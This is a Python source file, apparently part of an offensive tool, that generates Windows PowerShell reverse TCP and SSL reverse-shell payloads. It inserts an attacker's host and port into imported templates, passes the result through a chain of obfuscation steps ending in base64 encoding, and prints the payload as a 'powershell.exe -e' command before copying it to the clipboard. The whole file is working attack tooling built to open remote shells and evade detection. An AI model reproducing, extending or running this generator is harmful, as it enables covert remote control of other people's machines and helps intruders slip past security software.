from .common import *
from .payloads.Windows import powershell_reverse_tcp_ssl, powershell_reverse_tcp
from .obfuscation import *
import pyperclip


class PayloadGenerator:
    def __init__(self, payload_template, lhost, port, obfuscate):

        self.payload_template = payload_template
        self.lhost = lhost
        self.port = port
        self.obfuscate = obfuscate

    def copy_to_clipboard(self, payload):

        try:
            pyperclip.copy(payload)
            print(f"\n{INFO} Payload copied to clipboard")

        except Exception:
            print(f"{ERROR} Copying payload to clipboard")

    def obfuscation(self, payload):

        payload = variable_rename(payload)
        payload = cmdlet_concatenation(payload)
        payload = cmdlet_to_ascii(payload)
        payload = method_concatenation(payload)
        payload = string_concatenation(payload)
        payload = string_to_ascii(payload)
        payload = base64_encode(payload)

        return payload

    def payloadConfig(self, payload):

        payload = payload.replace('LHOST', self.lhost)
        payload = payload.replace('LPORT', str(self.port))

        return payload

    def invoke_obfuscation(self, payload):

        if self.obfuscate:
            payload = self.obfuscation(payload)
            generated = f"powershell.exe -e {payload}"

        else:
            generated = payload

        return generated

    def generatePayload(self):

        generated = ""

        if self.payload_template == "windows/powershell_reverse_tcp":

            payload = powershell_reverse_tcp.Payload.template
            payload = self.payloadConfig(payload)
            generated = self.invoke_obfuscation(payload)


        elif self.payload_template == "windows/powershell_reverse_tcp_ssl":

            payload = powershell_reverse_tcp_ssl.Payload.template

            payload = self.payloadConfig(payload)
            generated = self.invoke_obfuscation(payload)


        else:
            print(f"{ALERT} Payload template not found")

        print(f"\n{INFO} Generating ({self.payload_template}) payload ... \n")
        print(f"{YELLOW}{generated}{RST}")

        self.copy_to_clipboard(generated)
